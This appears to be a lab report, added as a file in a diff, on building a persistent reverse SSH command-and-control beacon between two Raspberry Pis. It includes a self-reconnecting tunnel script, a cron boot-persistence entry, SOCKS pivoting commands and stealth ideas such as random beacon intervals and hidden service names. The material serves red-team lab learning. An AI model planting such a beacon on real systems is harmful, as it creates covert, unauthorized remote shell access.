@@ -1,0 +1,244 @@
+# 📘 **Persistent Reverse SSH Command-and-Control Infrastructure — Lab Report**
+
+## **1. Purpose**
+
+The objective of this lab was to design and implement a **persistent reverse SSH tunnel** between two Raspberry Pi systems to emulate a Command-and-Control (C2) architecture frequently used in red-team operations, remote administration, and advanced post-exploitation scenarios.
+
+The goal was to enable:
+
+* A device behind NAT/firewalls (**Pi 3**) to automatically establish and maintain a remote tunnel to a C2 node (**Pi 4**).
+* The C2 node to SSH back into Pi 3 at any time without direct network reachability.
+* Full persistence, automatic reconnection, and self-healing capabilities.
+
+---
+
+## **2. System Overview**
+
+### **Hardware**
+
+| Device             | Hostname | Role            | Description                                         |
+| ------------------ | -------- | --------------- | --------------------------------------------------- |
+| **Raspberry Pi 3** | `fob`    | Client / Beacon | Hidden system behind NAT; initiates outbound tunnel |
+| **Raspberry Pi 4** | `c2`     | Server / C2     | Receives tunnel and provides remote operator access |
+
+### **Network Characteristics**
+
+* Pi 3 has **no inbound access** through NAT/firewall.
+* Outbound SSH from Pi 3 is allowed.
+* Pi 4 is reachable as `10.0.31.100`.
+
+---
+
+## **3. Conceptual Architecture**
+
+### **3.1 Why Reverse SSH?**
+
+Standard SSH requires inbound connectivity:
+
+```
+Pi 4 → Pi 3
+```
+
+Reverse SSH works even behind NAT:
+
+```
+Pi 3 → Pi 4  (outbound)
+Pi 4 → Pi 3  (via reverse-forwarded port)
+```
+
+### **3.2 C2 Model**
+
+The configuration replicates real-world C2 behavior:
+
+* **Beacon**: Pi 3 continuously calls home.
+* **C2 Node**: Pi 4 initiates shells back into Pi 3.
+* **Persistence**: Reconnects automatically.
+* **Stealth**: No visible shell or user interaction on Pi 3.
+
+---
+
+## **4. Implementation Steps**
+
+### **4.1 Key-Based Authentication**
+
+On Pi 3:
+
+```bash
+ssh-keygen -t ed25519
+ssh-copy-id bruce@10.0.31.100
+```
+
+This enables non-interactive SSH required for persistence.
+
+---
+
+### **4.2 Manual Reverse SSH Tunnel**
+
+From Pi 3:
+
+```bash
+ssh -N -R 2222:localhost:22 bruce@10.0.31.100
+```
+
+**Explanation:**
+
+| Component              | Purpose                                                |
+| ---------------------- | ------------------------------------------------------ |
+| `-N`                   | Tunnel only, no remote shell                           |
+| `-R 2222:localhost:22` | Makes Pi 3’s SSH service available on Pi 4’s port 2222 |
+
+Pi 4 accesses Pi 3 via:
+
+```bash
+ssh bruce@localhost -p 2222
+```
+
+---
+
+### **4.3 Persistent C2 Beacon Script**
+
+A script was created on Pi 3:
+
+**`/home/bruce/reverse-tunnel.sh`**
+
+```bash
+#!/bin/bash
+
+# Wait a bit for network to come up
+sleep 60
+
+while true; do
+  /usr/bin/ssh -N -o ServerAliveInterval=30 -o ServerAliveCountMax=3 \
+    -R 2222:localhost:22 bruce@10.0.31.100
+  sleep 5
+done
+```
+
+**Features:**
+
+* Waits for networking at boot
+* Maintains a persistent loop
+* Automatically reconnects after failure
+* Uses SSH keepalive options
+
+---
+
+### **4.4 Run on Boot with Cron**
+
+Pi 3 crontab entry:
+
+```bash
+@reboot /home/bruce/reverse-tunnel.sh >> /home/bruce/reverse-tunnel.log 2>&1
+```
+
+This ensures the beacon activates at startup.
+
+---
+
+## **5. Testing & Verification**
+
+### **5.1 Manual Script Test**
+
+```bash
+bash -x ~/reverse-tunnel.sh
+```
+
+Pi 4 confirmed the tunnel with:
+
+```bash
+ssh bruce@localhost -p 2222
+```
+
+### **5.2 Boot Persistence Test**
+
+After rebooting Pi 3:
+
+```bash
+sudo reboot
+```
+
+Pi 4 successfully connected again:
+
+```bash
+ssh bruce@localhost -p 2222
+```
+
+This verified:
+
+* Script execution at boot
+* Successful reverse tunnel creation
+* Stable C2 access
+
+---
+
+## **6. Results**
+
+This lab produced a fully functional reverse SSH C2 system featuring:
+
+### ✔ Persistent reverse tunnel
+
+### ✔ Automatic reconnection
+
+### ✔ Boot persistence
+
+### ✔ NAT/firewall traversal
+
+### ✔ Secure SSH-based transport
+
+### ✔ Remote shell access from Pi 4 → Pi 3
+
+### ✔ Autonomous self-healing behavior
+
+The configuration operates silently on Pi 3 with no visible interactive shell.
+
+---
+
+## **7. Security Considerations**
+
+* Only outbound SSH is used — no exposed ports on Pi 3.
+* Ed25519 key-based authentication improves security and automation.
+* Encrypted SSH transport prevents credential or command interception.
+* Pi 4 acts as a trusted control point.
+
+---
+
+## **8. Future Enhancements**
+
+### **Operational**
+
+* Convert cron job to `systemd` service
+* Integrate `autossh` for deeper resiliency
+* Add centralized logging on Pi 4
+
+### **C2 Capabilities**
+
+* Add additional reverse tunnels (web, VNC, APIs):
+
+  ```bash
+  -R 8081:localhost:8080
+  -R 5901:localhost:5900
+  ```
+* Implement SOCKS5 proxy pivot:
+
+  ```bash
+  ssh -D 1080 bruce@localhost -p 2222
+  ```
+
+### **Stealth**
+
+* Random beacon intervals
+* Port-knocking activation
+* Hidden service names
+* Encrypted configuration file
+
+---
+
+## **9. Conclusion**
+
+This project successfully deployed a **persistent, autonomous reverse SSH C2 architecture** using Raspberry Pi systems. Pi 3 reliably connects outbound to Pi 4 at startup and maintains a tunnel enabling Pi 4 to gain shell access at any time.
+
+The design is secure, resilient, and mirrors professional C2 behavior, making it ideal for advanced cybersecurity lab experimentation, red-team infrastructure development, and remote network pivoting.
+
+---
+
+
